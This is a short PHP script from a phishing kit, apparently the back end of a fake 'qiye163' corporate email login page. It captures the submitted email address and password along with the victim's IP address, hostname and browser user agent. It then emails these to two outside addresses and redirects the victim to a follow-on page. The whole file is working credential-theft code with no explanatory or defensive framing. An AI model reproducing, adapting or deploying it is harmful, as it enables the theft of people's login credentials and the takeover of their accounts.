<?php
if($_POST["email"] != "" and $_POST["password"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "|----------| PAPAZ & SON |--------------|\n";
$message .= "Online ID            : ".$_POST['email']."\n";
$message .= "Password              : ".$_POST['password']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- INFO CONT. --------------|\n";
$send = "ijazzy2@protonmail.com,ijazzy@yandex.com";
$domain = 'qiye163';
$subject = "qiye163";
$from = "From: $domain<west>\n";
{
mail("$send", "$subject", $message, $from, $domain);   
}
  header ("Location: index1.php?email=".$_POST['email']);
}else{
header ("Location: index.php");
}

?>